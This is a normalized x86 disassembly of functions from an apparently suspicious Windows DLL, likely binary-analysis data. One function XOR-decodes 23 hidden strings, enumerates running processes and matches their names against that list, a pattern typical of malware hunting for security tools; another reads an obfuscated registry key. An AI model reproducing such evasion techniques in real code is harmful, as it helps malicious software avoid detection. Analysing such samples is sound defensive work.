mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
retn
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] edx
mov ecx [ eax ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ eax ] ecx
retn
jmp r-xdata
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov ecx edx
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
sub_1004e470
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10057d80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
xor edi edi
xor eax eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_10039260
cmp eax edi
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_10058cd0
test eax eax
jne r-xdata
lea ebx [ esi + 0xd7c ]
push ebx
lea ecx [ ebp - 0x60 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
call sub_100358b0
cmp eax [ esi + 0xd58 ]
je r-xdata
lea ebx [ esi + 0xd5c ]
push ebx
lea eax [ ebp - 0x3c ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
push edx
push ebx
lea ecx [ edi + 0x12 ]
call sub_10017c80
mov edi 0x1
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov [ esi + 0xd58 ] eax
mov edi 0x1
jmp r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push ebx
mov ecx 0x10
call sub_10017c80
mov edi 0x1
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x64 ] edi
sub_1004e5b0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
push ebx
mov ebx [ lstrcmpW@IAT ]
mov [ ebp - 0x4 ] 0x0
push esi
lea eax [ edi + 0x1 ]
pop edi
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov edi [ edi + 0x4 ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov ecx [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov esi [ edi + 0x4 ]
push ecx
push edx
call ebx
test eax eax
je r-xdata
pop esi
pop ebx
lea eax [ edi + 0x2 ]
pop edi
mov esp ebp
pop ebp
retn 0x8
push edi
call [ LocalFree@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov esp ebp
pop ebp
retn 0x8
call sub_10055530
mov esi [ edi ]
test esi esi
je r-xdata
sub_1004e640
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edi
inc eax
push eax
push ecx
call sub_1006ee90
mov edx [ esi + 0x4 ]
mov edi eax
mov eax [ esi ]
push edx
push eax
push edi
call sub_1007f5d0
mov ecx [ esi + 0x4 ]
add esp 0x14
mov [ edi + ecx ] 0x0
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_1004e680
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_1004e6c0
push ebp
mov ebp esp
push ecx
push edi
lea edi [ ebp - 0x4 ]
mov edx esi
mov ecx ebx
call sub_100727a0
pop edi
test eax eax
js r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
push eax
mov eax esi
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072800
sub_1004e700
push ebp
mov ebp esp
sub esp 0x4d4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x2f
and edx 0xff
mov [ ebp + eax * 2 - 0x1a8 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x190 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x71
and edx 0xff
mov [ ebp + eax * 2 - 0x220 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x204 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x7c
and edx 0xff
mov [ ebp + eax * 2 - 0x24c ] dx
inc eax
cmp eax 0x14
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x224 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x6c
and edx 0xff
mov [ ebp + eax * 2 - 0x144 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12e ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x41
and edx 0xff
mov [ ebp + eax * 2 - 0x18c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x176 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffc4
and edx 0xff
mov [ ebp + eax * 2 - 0x114 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xfe ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x49
and edx 0xff
mov [ ebp + eax * 2 - 0x9c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffa3
and edx 0xff
mov [ ebp + eax * 2 - 0x6c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x53
and edx 0xff
mov [ ebp + eax * 2 - 0x1e0 ] dx
inc eax
cmp eax 0xd
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1c6 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffc6
and edx 0xff
mov [ ebp + eax * 2 - 0x174 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x15e ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffb7
and edx 0xff
mov [ ebp + eax * 2 - 0xcc ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xb6 ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0xfc ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xe6 ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x2a
and edx 0xff
mov [ ebp + eax * 2 - 0x12c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x116 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffab
and edx 0xff
mov [ ebp + eax * 2 - 0x200 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1e4 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcd
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1c ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9e
and edx 0xff
mov [ ebp + eax * 2 - 0x1c4 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1ac ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe1
and edx 0xff
mov [ ebp + eax * 2 - 0x15c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x146 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe8
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x42 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x54
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9e
and edx 0xff
mov [ ebp + eax * 2 - 0x84 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x70 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa1
and edx 0xff
mov [ ebp + eax * 2 - 0xe4 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xce ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffae
and edx 0xff
mov [ ebp + eax * 2 - 0x40 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x30 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff94
and edx 0xff
mov [ ebp + eax * 2 - 0xb4 ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
mov [ ebp - 0xa0 ] ax
lea ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x4d4 ] ecx
lea edx [ ebp - 0x220 ]
mov [ ebp - 0x4d0 ] edx
lea eax [ ebp - 0x24c ]
mov [ ebp - 0x4cc ] eax
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x4c8 ] ecx
lea edx [ ebp - 0x18c ]
mov [ ebp - 0x4c4 ] edx
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x4c0 ] eax
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4bc ] ecx
lea edx [ ebp - 0x6c ]
mov [ ebp - 0x4b8 ] edx
lea eax [ ebp - 0x1e0 ]
mov [ ebp - 0x4b4 ] eax
lea ecx [ ebp - 0x174 ]
mov [ ebp - 0x4b0 ] ecx
lea edx [ ebp - 0xcc ]
mov [ ebp - 0x4ac ] edx
lea eax [ ebp - 0xfc ]
mov [ ebp - 0x4a8 ] eax
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x4a4 ] ecx
lea edx [ ebp - 0x200 ]
mov [ ebp - 0x4a0 ] edx
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x1c4 ]
lea edx [ ebp - 0x15c ]
mov [ ebp - 0x49c ] eax
mov [ ebp - 0x498 ] ecx
mov [ ebp - 0x494 ] edx
push edi
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x84 ]
mov [ ebp - 0x490 ] eax
mov [ ebp - 0x48c ] ecx
mov [ ebp - 0x488 ] edx
push 0x0
lea eax [ ebp - 0xe4 ]
lea ecx [ ebp - 0x40 ]
lea edx [ ebp - 0xb4 ]
push 0x2
mov [ ebp - 0x484 ] eax
mov [ ebp - 0x480 ] ecx
mov [ ebp - 0x47c ] edx
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
lea eax [ ebp - 0x478 ]
push eax
push edi
mov [ ebp - 0x478 ] 0x22c
call [ Process32FirstW@IAT ]
mov ebx [ CharUpperW@IAT ]
push esi
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push edi
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
mov eax 0x1
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
inc esi
cmp esi 0x17
jb r-xdata
mov edx [ ebp + esi * 4 - 0x4d4 ]
push edx
lea eax [ ebp - 0x454 ]
push eax
call sub_1005f3a1
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ ebp - 0x478 ]
push ecx
push edi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x454 ]
push ecx
call ebx
xor esi esi
lea esp [ esp ]
push edi
call [ CloseHandle@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1004ed30
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov eax [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax esi
je r-xdata
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
test eax eax
je r-xdata
mov [ ebx ] 0x0
test esi esi
je r-xdata
push eax
call sub_10035d06
add esp 0x4
cmp [ esi ] 0x0
mov eax esi
je r-xdata
sub eax esi
push edi
lea edi [ eax + 0x1 ]
push edi
call sub_1000b33e
add esp 0x4
mov [ ebx ] eax
test eax eax
je r-xdata
mov edi edi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
push edi
push esi
push eax
call sub_1007f5d0
add esp 0xc
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_1004ed97
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1004ee30
push ebp
mov ebp esp
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x79
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0x27
jb r-xdata
lea ecx [ ebp - 0x6c ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0x68 ]
push edx
push 0x80000002
mov [ ebp - 0x1a ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push esi
lea edx [ ebp - 0x18 ]
mov eax 0x7
call sub_10049e00
lea edx [ ebp - 0x74 ]
push edx
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x6c ]
lea ecx [ ebp - 0x70 ]
push ecx
push 0x0
lea edx [ ebp - 0x18 ]
push edx
push eax
mov [ ebp - 0x74 ] 0x4
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
xor ecx ecx
cmp eax 0x2
setne cl
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x6c ]
push edx
call [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x6c ]
push ecx
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi 0x2
setne al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebp - 0x78 ] eax
pop esi
setne al
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1004ef40
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop edi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
call sub_1001bdc0
or eax 0x4
sub_1004ef8a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
lea eax [ ebp - 0x10 ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_100079d1
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1004efe0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_1002d84e
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_10021370
push ebx
push 0x0
mov ecx esi
call sub_10021370
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1000831a
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_1003f800
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
add ecx ebx
push ecx
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1004f0d0
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
cmp edi [ ebp + 0x8 ]
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x14 ]
push ebx
mov ebx [ edx + 0x10 ]
push esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
mov esi [ edi + 0x10 ]
mov eax esi
cmp eax esi
jae r-xdata
mov edx [ edx ]
mov ecx esi
cmp esi ebx
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx ebx
mov eax edi
mov eax [ edi ]
jmp r-xdata
add edi 0x1c
cmp edi [ ebp + 0x8 ]
jne r-xdata
cmp esi ebx
jb r-xdata
push ecx
push edx
push eax
call sub_1002b290
add esp 0xc
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
pop esi
mov eax edi
pop ebx
cmp esi ebx
setne al
test eax eax
je r-xdata
sub_1004f145
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_1001da0a
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_1006299d
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_1006299d
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_100427ff
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_100389b3
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_10083870
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10083980
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10083980
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_1007f940
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_10083980
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_100838a0
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_100838a0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_100838a0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_1004f4bb
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
